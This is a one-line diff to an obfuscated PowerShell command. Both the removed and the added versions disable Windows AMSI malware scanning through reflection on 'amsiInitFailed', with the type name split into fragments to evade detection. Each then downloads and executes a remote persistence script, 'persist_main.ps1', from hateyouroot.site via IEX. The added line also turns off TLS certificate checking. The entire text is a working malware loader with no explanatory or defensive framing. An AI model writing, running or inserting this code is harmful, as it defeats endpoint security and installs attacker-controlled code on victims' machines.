@@ -1,1 +1,1 @@
-$a='AmsiU';$b='tils';$c=[Ref].Assembly.GetType("System.Management.Automation.$a$b");$d=$c.GetField('amsiInitFailed','NonPublic,Static');$d.SetValue($null,$true);IEX(Invoke-RestMethod -Uri 'https://hateyouroot.site/persist_main.ps1')
+$a='Ams';$b='iUti';$c='ls';$d=[Ref].Assembly.GetType("System.Management.Automation.$a$b$c");$e=$d.GetField('amsiInitFailed','NonPublic,Static');$e.SetValue($null,$true);[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(Invoke-RestMethod -Uri 'https://www.hateyouroot.site/persist_main.ps1')
